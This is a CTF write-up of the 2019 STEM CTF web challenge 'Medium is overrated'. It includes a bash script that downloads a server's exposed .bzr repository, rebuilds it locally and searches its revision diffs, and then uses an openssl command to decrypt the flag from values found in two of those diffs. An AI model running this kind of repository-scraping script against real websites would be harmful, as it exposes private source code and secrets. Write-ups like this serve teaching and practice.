# STEM CTF Cyber Challenge 2019 – Medium is overrated

* **Category:** Web
* **Points:** 200

## Challenge

> I got hacked last time, but that’s not gonna stop me. The world deserves the next great blogging platform!
> 
> http://138.247.13.104

## Solution

Challenge is similar to the previous one (i.e. *My First Blog*), but the number of revisions is huge.

So a [bash script](bzr-chall-solver.sh) can be written to reproduce the repository locally.

The script will recreate the `index.php` file of the previous challenge and another file called `noIdeaWhatImDoing`.

Analyzing the history situation with `bzr log` and some `bzr diff`, you can discover that files were modified several times. Maybe one of these revisions will contain the flag.

After some analysis you can discover that changes on `index.php` are the ones really important. The initial script can be modified in order to discover all important differences on `index.php`.

```bash
#!/bin/bash

echo "[*] Creating local repository."
mkdir ctf-bzr
cd ctf-bzr/
bzr init
echo 'foo' > foo.txt
bzr add
bzr commit -m "foo"
rm foo.txt

echo "[*] Replacing last-revision file."
cd .bzr/branch
rm last-revision
wget http://138.247.13.104/.bzr/branch/last-revision

echo "[*] Replacing dirstate file."
cd ../checkout
rm dirstate
wget http://138.247.13.104/.bzr/checkout/dirstate

echo "[*] Replacing pack-names file."
cd ../repository
rm pack-names
wget http://138.247.13.104/.bzr/repository/pack-names


echo "[*] Using check command to discover missing files."
cd indices/
rm *.cix
rm *.iix
rm *.rix
rm *.six
rm *.tix
cd ../packs
rm *.pack
cd ../../../
while true; do
   CHECK_OUTPUT=$(bzr check 2>&1)
   if [[ $CHECK_OUTPUT == *"bzr: ERROR: No such file:"* ]]; then
      MISSING_FILE=$(echo $CHECK_OUTPUT | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
      echo "[*] Missing files $MISSING_FILE."
      declare -a EXTENSIONS=("cix" "iix" "rix" "six" "tix")
      for EXTENSION in "${EXTENSIONS[@]}"; do
         TARGET_URL="http://138.247.13.104/.bzr/repository/indices/$MISSING_FILE.$EXTENSION"
         echo "[*] Downloading $TARGET_URL"
         wget $TARGET_URL -P .bzr/repository/indices/
      done
      TARGET_URL="http://138.247.13.104/.bzr/repository/packs/$MISSING_FILE.pack"
      echo "[*] Downloading $TARGET_URL"
      wget $TARGET_URL -P .bzr/repository/packs/
   else
      echo "[*] Probably all missing files have been downloaded."
      break
   fi
done

echo "[*] Reverting missing source files."
bzr revert

echo "[*] Searching the flag into revisions."
R=1
while true; do
   RNEXT=$((R+1))
   
   # Analyzing diff.
   REVISION=$(bzr diff -r$R..$RNEXT)
   if [[ $REVISION == "" ]]; then
      break
   elif [[ $REVISION != *"noIdeaWhatImDoing"* ]]; then
      echo "[*] ... $R -> $RNEXT"
      echo $REVISION
   fi

   R=$RNEXT
done
```

Two differences can be identified.

```
$ bzr diff -r154..155
=== modified file 'index.php'
--- index.php	2018-12-06 18:48:25 +0000
+++ index.php	2018-12-06 22:52:42 +0000
@@ -10,6 +10,11 @@
             <h1 class="display-4">My Blog</h1>
             <p class="lead">Just a spot for me to talk about how much I love Canonical</p>
         </div>
+            <h1>Encryption is so cool!</h1>
+            <p>It's so cool that I can paste a block of text here and if its encrypted then none of you will EVER be able to read it! After reading about it, I'm so comfortable with it that I'm willing to paste my Bitcoin Wallet password right here:</p>
+            <p>NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==</p>
+            <p>There's like a whole 3 Bitcoin in there, but none of you will ever be able to get it!</p>
+            <hr>
             <h1>I love Canonical</h1>
             <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out</p>
             <ul>

$ bzr diff -r165..166
=== modified file 'index.php'
--- index.php	2018-12-06 22:54:52 +0000
+++ index.php	2018-12-06 23:00:02 +0000
@@ -10,6 +10,8 @@
             <h1 class="display-4">My Blog</h1>
             <p class="lead">Just a spot for me to talk about how much I love Canonical</p>
         </div>
+            <h1>CentOS is just RedHat</h1>
+            <p>A friend of mine was explaining how the company he works for pays for RedHat. I don't understand why they are LITERALLY throwing their money away since CentOS is just RedHat. In fact, CentOS is even better than RedHat since it discovers the fastest mirror automatically. I'm applying for one of their open job reqs just to give them a piece of my mind.</p>
             <h1>I love Canonical</h1>
             <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out</p>
             <ul>
@@ -26,4 +28,5 @@
             ?>
         </div>
     </body>
-</html>
\ No newline at end of file
+</html>
+<!-- 6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077 -->
\ No newline at end of file
```

The first one contains a base64 encoded password for a Bitcoin wallet.

```
NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==
```

Decoded string is the following.

```
5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751
```

The second one contains an hexadecimal string.

```
6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077
```

This string must be considered like the AES ECB key to decode the Bitcoin wallet password.

The following OpenSSL command will give you the flag.

```
$ openssl enc -d -aes-256-ecb -K '6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077' -in <(echo '5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751' | xxd -r -p)
```

The flag is the following.

```
MCA{I$love$bitcoin$so$much!}
```